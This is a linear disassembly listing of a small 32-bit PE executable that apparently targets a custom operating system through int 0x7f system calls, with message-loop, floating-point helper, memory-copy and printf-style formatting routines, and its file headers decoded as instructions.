00000000  90                nop
00000001  90                nop
00000002  90                nop
00000003  E908030000        jmp 0x310
00000008  0400              add al,0x0
0000000A  0000              add [eax],al
0000000C  FF                db 0xFF
0000000D  FF00              inc dword [eax]
0000000F  00B800000000      add [eax+0x0],bh
00000015  0000              add [eax],al
00000017  004000            add [eax+0x0],al
0000001A  0000              add [eax],al
0000001C  0000              add [eax],al
0000001E  0000              add [eax],al
00000020  0000              add [eax],al
00000022  0000              add [eax],al
00000024  0000              add [eax],al
00000026  0000              add [eax],al
00000028  0000              add [eax],al
0000002A  0000              add [eax],al
0000002C  0000              add [eax],al
0000002E  0000              add [eax],al
00000030  0000              add [eax],al
00000032  0000              add [eax],al
00000034  0000              add [eax],al
00000036  0000              add [eax],al
00000038  0000              add [eax],al
0000003A  0000              add [eax],al
0000003C  C8000000          enter 0x0,0x0
00000040  0E                push cs
00000041  1F                pop ds
00000042  BA0E00B409        mov edx,0x9b4000e
00000047  CD21              int 0x21
00000049  B8014CCD21        mov eax,0x21cd4c01
0000004E  54                push esp
0000004F  6869732070        push dword 0x70207369
00000054  726F              jc 0xc5
00000056  677261            a16 jc 0xba
00000059  6D                insd
0000005A  206361            and [ebx+0x61],ah
0000005D  6E                outsb
0000005E  6E                outsb
0000005F  6F                outsd
00000060  7420              jz 0x82
00000062  626520            bound esp,[ebp+0x20]
00000065  7275              jc 0xdc
00000067  6E                outsb
00000068  20696E            and [ecx+0x6e],ch
0000006B  20444F53          and [edi+ecx*2+0x53],al
0000006F  206D6F            and [ebp+0x6f],ch
00000072  64652E0D0D0A2400  cs or eax,0x240a0d
0000007A  0000              add [eax],al
0000007C  0000              add [eax],al
0000007E  0000              add [eax],al
00000080  56                push esi
00000081  45                inc ebp
00000082  0405              add al,0x5
00000084  12246A            adc ah,[edx+ebp*2]
00000087  56                push esi
00000088  12246A            adc ah,[edx+ebp*2]
0000008B  56                push esi
0000008C  12246A            adc ah,[edx+ebp*2]
0000008F  56                push esi
00000090  12246B            adc ah,[ebx+ebp*2]
00000093  56                push esi
00000094  53                push ebx
00000095  246A              and al,0x6a
00000097  56                push esi
00000098  703B              jo 0xd5
0000009A  7956              jns 0xf2
0000009C  11246A            adc [edx+ebp*2],esp
0000009F  56                push esi
000000A0  FA                cli
000000A1  3B6056            cmp esp,[eax+0x56]
000000A4  54                push esp
000000A5  246A              and al,0x6a
000000A7  56                push esi
000000A8  91                xchg eax,ecx
000000A9  38645606          cmp [esi+edx*2+0x6],ah
000000AD  246A              and al,0x6a
000000AF  56                push esi
000000B0  FA                cli
000000B1  3B6156            cmp esp,[ecx+0x56]
000000B4  1424              adc al,0x24
000000B6  6A56              push byte +0x56
000000B8  52                push edx
000000B9  69636812246A56    imul esp,[ebx+0x68],dword 0x566a2412
000000C0  0000              add [eax],al
000000C2  0000              add [eax],al
000000C4  0000              add [eax],al
000000C6  0000              add [eax],al
000000C8  50                push eax
000000C9  45                inc ebp
000000CA  0000              add [eax],al
000000CC  4C                dec esp
000000CD  010400            add [eax+eax],eax
000000D0  AF                scasd
000000D1  040B              add al,0xb
000000D3  4F                dec edi
000000D4  0000              add [eax],al
000000D6  0000              add [eax],al
000000D8  0000              add [eax],al
000000DA  0000              add [eax],al
000000DC  E000              loopne 0xde
000000DE  0E                push cs
000000DF  210B              and [ebx],ecx
000000E1  0106              add [esi],eax
000000E3  0030              add [eax],dh
000000E5  54                push esp
000000E6  0000              add [eax],al
000000E8  802800            sub byte [eax],0x0
000000EB  0000              add [eax],al
000000ED  0000              add [eax],al
000000EF  0010              add [eax],dl
000000F1  0300              add eax,[eax]
000000F3  006002            add [eax+0x2],ah
000000F6  0000              add [eax],al
000000F8  90                nop
000000F9  56                push esi
000000FA  0000              add [eax],al
000000FC  0000              add [eax],al
000000FE  1E                push ds
000000FF  0010              add [eax],dl
00000101  0000              add [eax],al
00000103  0010              add [eax],dl
00000105  0000              add [eax],al
00000107  000400            add [eax+eax],al
0000010A  0000              add [eax],al
0000010C  0000              add [eax],al
0000010E  0000              add [eax],al
00000110  0400              add al,0x0
00000112  0000              add [eax],al
00000114  0000              add [eax],al
00000116  0000              add [eax],al
00000118  107F00            adc [edi+0x0],bh
0000011B  006002            add [eax+0x2],ah
0000011E  0000              add [eax],al
00000120  0000              add [eax],al
00000122  0000              add [eax],al
00000124  0300              add eax,[eax]
00000126  0000              add [eax],al
00000128  0000              add [eax],al
0000012A  1000              adc [eax],al
0000012C  0010              add [eax],dl
0000012E  0000              add [eax],al
00000130  0000              add [eax],al
00000132  1000              adc [eax],al
00000134  0010              add [eax],dl
00000136  0000              add [eax],al
00000138  0000              add [eax],al
0000013A  0000              add [eax],al
0000013C  1000              adc [eax],al
0000013E  0000              add [eax],al
00000140  0000              add [eax],al
00000142  0000              add [eax],al
00000144  0000              add [eax],al
00000146  0000              add [eax],al
00000148  58                pop eax
00000149  5C                pop esp
0000014A  0000              add [eax],al
0000014C  2800              sub [eax],al
0000014E  0000              add [eax],al
00000150  0000              add [eax],al
00000152  0000              add [eax],al
00000154  0000              add [eax],al
00000156  0000              add [eax],al
00000158  0000              add [eax],al
0000015A  0000              add [eax],al
0000015C  0000              add [eax],al
0000015E  0000              add [eax],al
00000160  0000              add [eax],al
00000162  0000              add [eax],al
00000164  0000              add [eax],al
00000166  0000              add [eax],al
00000168  E072              loopne 0x1dc
0000016A  0000              add [eax],al
0000016C  58                pop eax
0000016D  0400              add al,0x0
0000016F  0000              add [eax],al
00000171  0000              add [eax],al
00000173  0000              add [eax],al
00000175  0000              add [eax],al
00000177  0000              add [eax],al
00000179  0000              add [eax],al
0000017B  0000              add [eax],al
0000017D  0000              add [eax],al
0000017F  0000              add [eax],al
00000181  0000              add [eax],al
00000183  0000              add [eax],al
00000185  0000              add [eax],al
00000187  0000              add [eax],al
00000189  0000              add [eax],al
0000018B  0000              add [eax],al
0000018D  0000              add [eax],al
0000018F  0000              add [eax],al
00000191  0000              add [eax],al
00000193  0000              add [eax],al
00000195  0000              add [eax],al
00000197  0000              add [eax],al
00000199  0000              add [eax],al
0000019B  0000              add [eax],al
0000019D  0000              add [eax],al
0000019F  009056000078      add [eax+0x78000056],dl
000001A5  0000              add [eax],al
000001A7  0000              add [eax],al
000001A9  0000              add [eax],al
000001AB  0000              add [eax],al
000001AD  0000              add [eax],al
000001AF  0000              add [eax],al
000001B1  0000              add [eax],al
000001B3  0000              add [eax],al
000001B5  0000              add [eax],al
000001B7  0000              add [eax],al
000001B9  0000              add [eax],al
000001BB  0000              add [eax],al
000001BD  0000              add [eax],al
000001BF  002E              add [esi],ch
000001C1  7465              jz 0x228
000001C3  7874              js 0x239
000001C5  0000              add [eax],al
000001C7  0022              add [edx],ah
000001C9  54                push esp
000001CA  0000              add [eax],al
000001CC  60                pusha
000001CD  0200              add al,[eax]
000001CF  0030              add [eax],dh
000001D1  54                push esp
000001D2  0000              add [eax],al
000001D4  60                pusha
000001D5  0200              add al,[eax]
000001D7  0000              add [eax],al
000001D9  0000              add [eax],al
000001DB  0000              add [eax],al
000001DD  0000              add [eax],al
000001DF  0000              add [eax],al
000001E1  0000              add [eax],al
000001E3  0020              add [eax],ah
000001E5  0000              add [eax],al
000001E7  60                pusha
000001E8  2E7264            cs jc 0x24f
000001EB  61                popa
000001EC  7461              jz 0x24f
000001EE  0000              add [eax],al
000001F0  7208              jc 0x1fa
000001F2  0000              add [eax],al
000001F4  90                nop
000001F5  56                push esi
000001F6  0000              add [eax],al
000001F8  800800            or byte [eax],0x0
000001FB  009056000000      add [eax+0x56],dl
00000201  0000              add [eax],al
00000203  0000              add [eax],al
00000205  0000              add [eax],al
00000207  0000              add [eax],al
00000209  0000              add [eax],al
0000020B  004000            add [eax+0x0],al
0000020E  00402E            add [eax+0x2e],al
00000211  6461              fs popa
00000213  7461              jz 0x276
00000215  0000              add [eax],al
00000217  00C8              add al,cl
00000219  1300              adc eax,[eax]
0000021B  0010              add [eax],dl
0000021D  5F                pop edi
0000021E  0000              add [eax],al
00000220  D013              rcl byte [ebx],1
00000222  0000              add [eax],al
00000224  105F00            adc [edi+0x0],bl
00000227  0000              add [eax],al
00000229  0000              add [eax],al
0000022B  0000              add [eax],al
0000022D  0000              add [eax],al
0000022F  0000              add [eax],al
00000231  0000              add [eax],al
00000233  004000            add [eax+0x0],al
00000236  00C0              add al,al
00000238  2E7265            cs jc 0x2a0
0000023B  6C                insb
0000023C  6F                outsd
0000023D  6300              arpl [eax],ax
0000023F  00240C            add [esp+ecx],ah
00000242  0000              add [eax],al
00000244  E072              loopne 0x2b8
00000246  0000              add [eax],al
00000248  300C00            xor [eax+eax],cl
0000024B  00E0              add al,ah
0000024D  7200              jc 0x24f
0000024F  0000              add [eax],al
00000251  0000              add [eax],al
00000253  0000              add [eax],al
00000255  0000              add [eax],al
00000257  0000              add [eax],al
00000259  0000              add [eax],al
0000025B  004000            add [eax+0x0],al
0000025E  004283            add [edx-0x7d],al
00000261  EC                in al,dx
00000262  186A00            sbb [edx+0x0],ch
00000265  68CCCCCCCC        push dword 0xcccccccc
0000026A  68CCCCCCCC        push dword 0xcccccccc
0000026F  68CCCCCCCC        push dword 0xcccccccc
00000274  6A00              push byte +0x0
00000276  6AFF              push byte -0x1
00000278  6AFF              push byte -0x1
0000027A  6AFF              push byte -0x1
0000027C  6AFF              push byte -0x1
0000027E  68705F1E00        push dword 0x1e5f70
00000283  6A41              push byte +0x41
00000285  E8B6000000        call 0x340
0000028A  83C42C            add esp,byte +0x2c
0000028D  85C0              test eax,eax
0000028F  751B              jnz 0x2ac
00000291  6A01              push byte +0x1
00000293  68685F1E00        push dword 0x1e5f68
00000298  68405F1E00        push dword 0x1e5f40
0000029D  50                push eax
0000029E  E8DD010000        call 0x480
000002A3  83C410            add esp,byte +0x10
000002A6  33C0              xor eax,eax
000002A8  83C418            add esp,byte +0x18
000002AB  C3                ret
000002AC  8D442400          lea eax,[esp+0x0]
000002B0  50                push eax
000002B1  E86A000000        call 0x320
000002B6  83C404            add esp,byte +0x4
000002B9  85C0              test eax,eax
000002BB  74EF              jz 0x2ac
000002BD  8B442400          mov eax,[esp+0x0]
000002C1  25FFFF0000        and eax,0xffff
000002C6  83E805            sub eax,byte +0x5
000002C9  74DB              jz 0x2a6
000002CB  48                dec eax
000002CC  7416              jz 0x2e4
000002CE  2D2E010000        sub eax,0x12e
000002D3  75D7              jnz 0x2ac
000002D5  8B4C2404          mov ecx,[esp+0x4]
000002D9  51                push ecx
000002DA  E881010000        call 0x460
000002DF  83C404            add esp,byte +0x4
000002E2  EBC8              jmp short 0x2ac
000002E4  8B442404          mov eax,[esp+0x4]
000002E8  8D542408          lea edx,[esp+0x8]
000002EC  52                push edx
000002ED  50                push eax
000002EE  89442410          mov [esp+0x10],eax
000002F2  C744241412000000  mov dword [esp+0x14],0x12
000002FA  E841010000        call 0x440
000002FF  83C408            add esp,byte +0x8
00000302  EBA8              jmp short 0x2ac
00000304  90                nop
00000305  90                nop
00000306  90                nop
00000307  90                nop
00000308  90                nop
00000309  90                nop
0000030A  90                nop
0000030B  90                nop
0000030C  90                nop
0000030D  90                nop
0000030E  90                nop
0000030F  90                nop
00000310  6A00              push byte +0x0
00000312  E849FFFFFF        call 0x260
00000317  59                pop ecx
00000318  C3                ret
00000319  90                nop
0000031A  90                nop
0000031B  90                nop
0000031C  90                nop
0000031D  90                nop
0000031E  90                nop
0000031F  90                nop
00000320  55                push ebp
00000321  8BEC              mov ebp,esp
00000323  FF7508            push dword [ebp+0x8]
00000326  6A00              push byte +0x0
00000328  6A07              push byte +0x7
0000032A  CD7F              int 0x7f
0000032C  58                pop eax
0000032D  58                pop eax
0000032E  8F4508            pop dword [ebp+0x8]
00000331  5D                pop ebp
00000332  C3                ret
00000333  90                nop
00000334  90                nop
00000335  90                nop
00000336  90                nop
00000337  90                nop
00000338  90                nop
00000339  90                nop
0000033A  90                nop
0000033B  90                nop
0000033C  90                nop
0000033D  90                nop
0000033E  90                nop
0000033F  90                nop
00000340  55                push ebp
00000341  8BEC              mov ebp,esp
00000343  83EC40            sub esp,byte +0x40
00000346  8B4530            mov eax,[ebp+0x30]
00000349  8B4D2C            mov ecx,[ebp+0x2c]
0000034C  8B5528            mov edx,[ebp+0x28]
0000034F  53                push ebx
00000350  56                push esi
00000351  8B7518            mov esi,[ebp+0x18]
00000354  50                push eax
00000355  8B4524            mov eax,[ebp+0x24]
00000358  51                push ecx
00000359  8B4D20            mov ecx,[ebp+0x20]
0000035C  52                push edx
0000035D  8B551C            mov edx,[ebp+0x1c]
00000360  50                push eax
00000361  8B4514            mov eax,[ebp+0x14]
00000364  51                push ecx
00000365  8B4D10            mov ecx,[ebp+0x10]
00000368  52                push edx
00000369  8B550C            mov edx,[ebp+0xc]
0000036C  56                push esi
0000036D  50                push eax
0000036E  8B4508            mov eax,[ebp+0x8]
00000371  51                push ecx
00000372  52                push edx
00000373  50                push eax
00000374  8D4DC0            lea ecx,[ebp-0x40]
00000377  688C5F1E00        push dword 0x1e5f8c
0000037C  51                push ecx
0000037D  E8DE140000        call 0x1860
00000382  6A01              push byte +0x1
00000384  8D55C0            lea edx,[ebp-0x40]
00000387  68845F1E00        push dword 0x1e5f84
0000038C  52                push edx
0000038D  6A00              push byte +0x0
0000038F  E8EC000000        call 0x480
00000394  83C444            add esp,byte +0x44
00000397  B898988989        mov eax,0x89899898
0000039C  BB98989898        mov ebx,0x98989898
000003A1  FF7530            push dword [ebp+0x30]
000003A4  FF752C            push dword [ebp+0x2c]
000003A7  FF7528            push dword [ebp+0x28]
000003AA  FF7524            push dword [ebp+0x24]
000003AD  FF7520            push dword [ebp+0x20]
000003B0  FF751C            push dword [ebp+0x1c]
000003B3  6651              push cx
000003B5  FF7514            push dword [ebp+0x14]
000003B8  FF7510            push dword [ebp+0x10]
000003BB  FF750C            push dword [ebp+0xc]
000003BE  FF7508            push dword [ebp+0x8]
000003C1  6A00              push byte +0x0
000003C3  6800010000        push dword 0x100
000003C8  CD7F              int 0x7f
000003CA  58                pop eax
000003CB  58                pop eax
000003CC  8F4508            pop dword [ebp+0x8]
000003CF  8F450C            pop dword [ebp+0xc]
000003D2  8F4510            pop dword [ebp+0x10]
000003D5  8F4514            pop dword [ebp+0x14]
000003D8  6659              pop cx
000003DA  8F451C            pop dword [ebp+0x1c]
000003DD  8F4520            pop dword [ebp+0x20]
000003E0  8F4524            pop dword [ebp+0x24]
000003E3  8F4528            pop dword [ebp+0x28]
000003E6  8F452C            pop dword [ebp+0x2c]
000003E9  8F4530            pop dword [ebp+0x30]
000003EC  8B4530            mov eax,[ebp+0x30]
000003EF  8B4D2C            mov ecx,[ebp+0x2c]
000003F2  8B5528            mov edx,[ebp+0x28]
000003F5  50                push eax
000003F6  8B4524            mov eax,[ebp+0x24]
000003F9  51                push ecx
000003FA  8B4D20            mov ecx,[ebp+0x20]
000003FD  52                push edx
000003FE  8B551C            mov edx,[ebp+0x1c]
00000401  50                push eax
00000402  8B4514            mov eax,[ebp+0x14]
00000405  51                push ecx
00000406  8B4D10            mov ecx,[ebp+0x10]
00000409  52                push edx
0000040A  8B550C            mov edx,[ebp+0xc]
0000040D  56                push esi
0000040E  50                push eax
0000040F  8B4508            mov eax,[ebp+0x8]
00000412  51                push ecx
00000413  52                push edx
00000414  50                push eax
00000415  8D4DC0            lea ecx,[ebp-0x40]
00000418  688C5F1E00        push dword 0x1e5f8c
0000041D  51                push ecx
0000041E  E83D140000        call 0x1860
00000423  6A01              push byte +0x1
00000425  8D55C0            lea edx,[ebp-0x40]
00000428  68845F1E00        push dword 0x1e5f84
0000042D  52                push edx
0000042E  6A00              push byte +0x0
00000430  E84B000000        call 0x480
00000435  83C444            add esp,byte +0x44
00000438  5E                pop esi
00000439  5B                pop ebx
0000043A  8BE5              mov esp,ebp
0000043C  5D                pop ebp
0000043D  C3                ret
0000043E  90                nop
0000043F  90                nop
00000440  55                push ebp
00000441  8BEC              mov ebp,esp
00000443  FF750C            push dword [ebp+0xc]
00000446  FF7508            push dword [ebp+0x8]
00000449  6A00              push byte +0x0
0000044B  680F010000        push dword 0x10f
00000450  CD7F              int 0x7f
00000452  58                pop eax
00000453  58                pop eax
00000454  8F4508            pop dword [ebp+0x8]
00000457  8F450C            pop dword [ebp+0xc]
0000045A  5D                pop ebp
0000045B  C3                ret
0000045C  90                nop
0000045D  90                nop
0000045E  90                nop
0000045F  90                nop
00000460  55                push ebp
00000461  8BEC              mov ebp,esp
00000463  FF7508            push dword [ebp+0x8]
00000466  6A00              push byte +0x0
00000468  6810010000        push dword 0x110
0000046D  CD7F              int 0x7f
0000046F  58                pop eax
00000470  58                pop eax
00000471  8F4508            pop dword [ebp+0x8]
00000474  5D                pop ebp
00000475  C3                ret
00000476  90                nop
00000477  90                nop
00000478  90                nop
00000479  90                nop
0000047A  90                nop
0000047B  90                nop
0000047C  90                nop
0000047D  90                nop
0000047E  90                nop
0000047F  90                nop
00000480  55                push ebp
00000481  8BEC              mov ebp,esp
00000483  FF7514            push dword [ebp+0x14]
00000486  FF7510            push dword [ebp+0x10]
00000489  FF750C            push dword [ebp+0xc]
0000048C  FF7508            push dword [ebp+0x8]
0000048F  6A00              push byte +0x0
00000491  682E010000        push dword 0x12e
00000496  CD7F              int 0x7f
00000498  58                pop eax
00000499  58                pop eax
0000049A  8F4508            pop dword [ebp+0x8]
0000049D  8F450C            pop dword [ebp+0xc]
000004A0  8F4510            pop dword [ebp+0x10]
000004A3  8F4514            pop dword [ebp+0x14]
000004A6  5D                pop ebp
000004A7  C3                ret
000004A8  90                nop
000004A9  90                nop
000004AA  90                nop
000004AB  90                nop
000004AC  90                nop
000004AD  90                nop
000004AE  90                nop
000004AF  90                nop
000004B0  53                push ebx
000004B1  56                push esi
000004B2  8B742410          mov esi,[esp+0x10]
000004B6  57                push edi
000004B7  8BCE              mov ecx,esi
000004B9  C1E914            shr ecx,0x14
000004BC  81E1FF070000      and ecx,0x7ff
000004C2  81E9FF030000      sub ecx,0x3ff
000004C8  83F914            cmp ecx,byte +0x14
000004CB  0F8DCA000000      jnl near 0x59b
000004D1  85C9              test ecx,ecx
000004D3  7D29              jnl 0x4fe
000004D5  8B442418          mov eax,[esp+0x18]
000004D9  C70000000000      mov dword [eax],0x0
000004DF  C7400400000000    mov dword [eax+0x4],0x0
000004E6  8B4804            mov ecx,[eax+0x4]
000004E9  33CE              xor ecx,esi
000004EB  81E1FFFFFF7F      and ecx,0x7fffffff
000004F1  33CE              xor ecx,esi
000004F3  894804            mov [eax+0x4],ecx
000004F6  DD442410          fld qword [esp+0x10]
000004FA  5F                pop edi
000004FB  5E                pop esi
000004FC  5B                pop ebx
000004FD  C3                ret
000004FE  F7C6FFFF0F00      test esi,0xfffff
00000504  751C              jnz 0x522
00000506  8B442410          mov eax,[esp+0x10]
0000050A  85C0              test eax,eax
0000050C  7514              jnz 0x522
0000050E  DD442410          fld qword [esp+0x10]
00000512  8B542418          mov edx,[esp+0x18]
00000516  5F                pop edi
00000517  5E                pop esi
00000518  5B                pop ebx
00000519  DD1A              fstp qword [edx]
0000051B  DD0508571E00      fld qword [0x1e5708]
00000521  C3                ret
00000522  8B7C2418          mov edi,[esp+0x18]
00000526  DD442410          fld qword [esp+0x10]
0000052A  8B4704            mov eax,[edi+0x4]
0000052D  C70700000000      mov dword [edi],0x0
00000533  33C6              xor eax,esi
00000535  25FFFFFF7F        and eax,0x7fffffff
0000053A  33C6              xor eax,esi
0000053C  8BD0              mov edx,eax
0000053E  33D6              xor edx,esi
00000540  81E20000F07F      and edx,0x7ff00000
00000546  33D0              xor edx,eax
00000548  B8FFFF0F00        mov eax,0xfffff
0000054D  D3F8              sar eax,cl
0000054F  F7D0              not eax
00000551  23C6              and eax,esi
00000553  33C2              xor eax,edx
00000555  25FFFF0F00        and eax,0xfffff
0000055A  33C2              xor eax,edx
0000055C  894704            mov [edi+0x4],eax
0000055F  DC1F              fcomp qword [edi]
00000561  DFE0              fnstsw ax
00000563  F6C440            test ah,0x40
00000566  0F8404010000      jz near 0x670
0000056C  8B7F04            mov edi,[edi+0x4]
0000056F  C744241400000000  mov dword [esp+0x14],0x0
00000577  8B742414          mov esi,[esp+0x14]
0000057B  8BCF              mov ecx,edi
0000057D  33CE              xor ecx,esi
0000057F  C744241000000000  mov dword [esp+0x10],0x0
00000587  81E1FFFFFF7F      and ecx,0x7fffffff
0000058D  33CF              xor ecx,edi
0000058F  5F                pop edi
00000590  894C2410          mov [esp+0x10],ecx
00000594  5E                pop esi
00000595  DD442408          fld qword [esp+0x8]
00000599  5B                pop ebx
0000059A  C3                ret
0000059B  83F933            cmp ecx,byte +0x33
0000059E  7E59              jng 0x5f9
000005A0  DD442410          fld qword [esp+0x10]
000005A4  8B5C2418          mov ebx,[esp+0x18]
000005A8  8B7C2410          mov edi,[esp+0x10]
000005AC  56                push esi
000005AD  57                push edi
000005AE  DD1B              fstp qword [ebx]
000005B0  E8CB000000        call 0x680
000005B5  83C408            add esp,byte +0x8
000005B8  85C0              test eax,eax
000005BA  0F8536FFFFFF      jnz near 0x4f6
000005C0  56                push esi
000005C1  57                push edi
000005C2  E8F9000000        call 0x6c0
000005C7  83C408            add esp,byte +0x8
000005CA  85C0              test eax,eax
000005CC  0F8524FFFFFF      jnz near 0x4f6
000005D2  89442410          mov [esp+0x10],eax
000005D6  89442414          mov [esp+0x14],eax
000005DA  8B4304            mov eax,[ebx+0x4]
000005DD  8B7C2414          mov edi,[esp+0x14]
000005E1  8BD0              mov edx,eax
000005E3  33D7              xor edx,edi
000005E5  5F                pop edi
000005E6  81E2FFFFFF7F      and edx,0x7fffffff
000005EC  5E                pop esi
000005ED  33D0              xor edx,eax
000005EF  5B                pop ebx
000005F0  89542408          mov [esp+0x8],edx
000005F4  DD442404          fld qword [esp+0x4]
000005F8  C3                ret
000005F9  8B7C2418          mov edi,[esp+0x18]
000005FD  83C1EC            add ecx,byte -0x14
00000600  DD442410          fld qword [esp+0x10]
00000604  8B4704            mov eax,[edi+0x4]
00000607  33C6              xor eax,esi
00000609  25FFFFFF7F        and eax,0x7fffffff
0000060E  33C6              xor eax,esi
00000610  8BD0              mov edx,eax
00000612  33D6              xor edx,esi
00000614  81E20000F07F      and edx,0x7ff00000
0000061A  33D0              xor edx,eax
0000061C  8BC2              mov eax,edx
0000061E  33C6              xor eax,esi
00000620  25FFFF0F00        and eax,0xfffff
00000625  33C2              xor eax,edx
00000627  83CAFF            or edx,byte -0x1
0000062A  D3EA              shr edx,cl
0000062C  894704            mov [edi+0x4],eax
0000062F  8B442410          mov eax,[esp+0x10]
00000633  F7D2              not edx
00000635  23D0              and edx,eax
00000637  8917              mov [edi],edx
00000639  DC1F              fcomp qword [edi]
0000063B  DFE0              fnstsw ax
0000063D  F6C440            test ah,0x40
00000640  742E              jz 0x670
00000642  8B7F04            mov edi,[edi+0x4]
00000645  C744241400000000  mov dword [esp+0x14],0x0
0000064D  8B742414          mov esi,[esp+0x14]
00000651  8BC7              mov eax,edi
00000653  33C6              xor eax,esi
00000655  C744241000000000  mov dword [esp+0x10],0x0
0000065D  25FFFFFF7F        and eax,0x7fffffff
00000662  33C7              xor eax,edi
00000664  5F                pop edi
00000665  89442410          mov [esp+0x10],eax
00000669  5E                pop esi
0000066A  DD442408          fld qword [esp+0x8]
0000066E  5B                pop ebx
0000066F  C3                ret
00000670  DD442410          fld qword [esp+0x10]
00000674  DC27              fsub qword [edi]
00000676  5F                pop edi
00000677  5E                pop esi
00000678  5B                pop ebx
00000679  C3                ret
0000067A  90                nop
0000067B  90                nop
0000067C  90                nop
0000067D  90                nop
0000067E  90                nop
0000067F  90                nop
00000680  8B4C2404          mov ecx,[esp+0x4]
00000684  8B542408          mov edx,[esp+0x8]
00000688  33C0              xor eax,eax
0000068A  894C2404          mov [esp+0x4],ecx
0000068E  85C9              test ecx,ecx
00000690  89542408          mov [esp+0x8],edx
00000694  751F              jnz 0x6b5
00000696  8BCA              mov ecx,edx
00000698  81F90000F87F      cmp ecx,0x7ff80000
0000069E  7410              jz 0x6b0
000006A0  81F90000F07F      cmp ecx,0x7ff00000
000006A6  7408              jz 0x6b0
000006A8  81F90000F8FF      cmp ecx,0xfff80000
000006AE  7505              jnz 0x6b5
000006B0  B801000000        mov eax,0x1
000006B5  C3                ret
000006B6  90                nop
000006B7  90                nop
000006B8  90                nop
000006B9  90                nop
000006BA  90                nop
000006BB  90                nop
000006BC  90                nop
000006BD  90                nop
000006BE  90                nop
000006BF  90                nop
000006C0  8B442404          mov eax,[esp+0x4]
000006C4  8B4C2408          mov ecx,[esp+0x8]
000006C8  85C0              test eax,eax
000006CA  89442404          mov [esp+0x4],eax
000006CE  894C2408          mov [esp+0x8],ecx
000006D2  751A              jnz 0x6ee
000006D4  8BC1              mov eax,ecx
000006D6  3D0000F07F        cmp eax,0x7ff00000
000006DB  7506              jnz 0x6e3
000006DD  B801000000        mov eax,0x1
000006E2  C3                ret
000006E3  3D0000F0FF        cmp eax,0xfff00000
000006E8  7504              jnz 0x6ee
000006EA  83C8FF            or eax,byte -0x1
000006ED  C3                ret
000006EE  33C0              xor eax,eax
000006F0  C3                ret
000006F1  90                nop
000006F2  90                nop
000006F3  90                nop
000006F4  90                nop
000006F5  90                nop
000006F6  90                nop
000006F7  90                nop
000006F8  90                nop
000006F9  90                nop
000006FA  90                nop
000006FB  90                nop
000006FC  90                nop
000006FD  90                nop
000006FE  90                nop
000006FF  90                nop
00000700  56                push esi
00000701  8B742410          mov esi,[esp+0x10]
00000705  57                push edi
00000706  8B7C240C          mov edi,[esp+0xc]
0000070A  85F6              test esi,esi
0000070C  8BCF              mov ecx,edi
0000070E  740F              jz 0x71f
00000710  8B542410          mov edx,[esp+0x10]
00000714  2BD7              sub edx,edi
00000716  8A040A            mov al,[edx+ecx]
00000719  8801              mov [ecx],al
0000071B  41                inc ecx
0000071C  4E                dec esi
0000071D  75F7              jnz 0x716
0000071F  8BC7              mov eax,edi
00000721  5F                pop edi
00000722  5E                pop esi
00000723  C3                ret
00000724  90                nop
00000725  90                nop
00000726  90                nop
00000727  90                nop
00000728  90                nop
00000729  90                nop
0000072A  90                nop
0000072B  90                nop
0000072C  90                nop
0000072D  90                nop
0000072E  90                nop
0000072F  90                nop
00000730  83EC10            sub esp,byte +0x10
00000733  55                push ebp
00000734  8B6C2418          mov ebp,[esp+0x18]
00000738  57                push edi
00000739  8B7C2420          mov edi,[esp+0x20]
0000073D  8A07              mov al,[edi]
0000073F  84C0              test al,al
00000741  0F8418040000      jz near 0xb5f
00000747  53                push ebx
00000748  8B5C2428          mov ebx,[esp+0x28]
0000074C  56                push esi
0000074D  8D4BF8            lea ecx,[ebx-0x8]
00000750  83C3FC            add ebx,byte -0x4
00000753  894C242C          mov [esp+0x2c],ecx
00000757  EB04              jmp short 0x75d
00000759  8B7C2428          mov edi,[esp+0x28]
0000075D  3C25              cmp al,0x25
0000075F  7409              jz 0x76a
00000761  884500            mov [ebp+0x0],al
00000764  45                inc ebp
00000765  E9E0030000        jmp 0xb4a
0000076A  33C9              xor ecx,ecx
0000076C  47                inc edi
0000076D  897C2428          mov [esp+0x28],edi
00000771  894C2414          mov [esp+0x14],ecx
00000775  0FBE37            movsx esi,byte [edi]
00000778  83C6E0            add esi,byte -0x20
0000077B  83FE10            cmp esi,byte +0x10
0000077E  773A              ja 0x7ba
00000780  33D2              xor edx,edx
00000782  8A968C0B1E00      mov dl,[esi+0x1e0b8c]
00000788  FF2495740B1E00    jmp near [edx*4+0x1e0b74]
0000078F  83C910            or ecx,byte +0x10
00000792  EB12              jmp short 0x7a6
00000794  83C904            or ecx,byte +0x4
00000797  EB0D              jmp short 0x7a6
00000799  83C908            or ecx,byte +0x8
0000079C  EB08              jmp short 0x7a6
0000079E  83C920            or ecx,byte +0x20
000007A1  EB03              jmp short 0x7a6
000007A3  83C901            or ecx,byte +0x1
000007A6  47                inc edi
000007A7  897C2428          mov [esp+0x28],edi
000007AB  0FBE37            movsx esi,byte [edi]
000007AE  83C6E0            add esi,byte -0x20
000007B1  83FE10            cmp esi,byte +0x10
000007B4  76CA              jna 0x780
000007B6  894C2414          mov [esp+0x14],ecx
000007BA  8A07              mov al,[edi]
000007BC  83CEFF            or esi,byte -0x1
000007BF  3C30              cmp al,0x30
000007C1  7C1D              jl 0x7e0
000007C3  3C39              cmp al,0x39
000007C5  7F19              jg 0x7e0
000007C7  8D442428          lea eax,[esp+0x28]
000007CB  50                push eax
000007CC  E86F040000        call 0xc40
000007D1  8B4C2418          mov ecx,[esp+0x18]
000007D5  8B7C242C          mov edi,[esp+0x2c]
000007D9  83C404            add esp,byte +0x4
000007DC  8BF0              mov esi,eax
000007DE  EB27              jmp short 0x807
000007E0  3C2A              cmp al,0x2a
000007E2  7523              jnz 0x807
000007E4  8B54242C          mov edx,[esp+0x2c]
000007E8  8B7304            mov esi,[ebx+0x4]
000007EB  83C304            add ebx,byte +0x4
000007EE  47                inc edi
000007EF  83C204            add edx,byte +0x4
000007F2  897C2428          mov [esp+0x28],edi
000007F6  85F6              test esi,esi
000007F8  8954242C          mov [esp+0x2c],edx
000007FC  7D09              jnl 0x807
000007FE  F7DE              neg esi
00000800  83C910            or ecx,byte +0x10
00000803  894C2414          mov [esp+0x14],ecx
00000807  8A07              mov al,[edi]
00000809  C7442410FFFFFFFF  mov dword [esp+0x10],0xffffffff
00000811  3C2E              cmp al,0x2e
00000813  7553              jnz 0x868
00000815  47                inc edi
00000816  897C2428          mov [esp+0x28],edi
0000081A  8A07              mov al,[edi]
0000081C  3C30              cmp al,0x30
0000081E  7C1F              jl 0x83f
00000820  3C39              cmp al,0x39
00000822  7F1B              jg 0x83f
00000824  8D4C2428          lea ecx,[esp+0x28]
00000828  51                push ecx
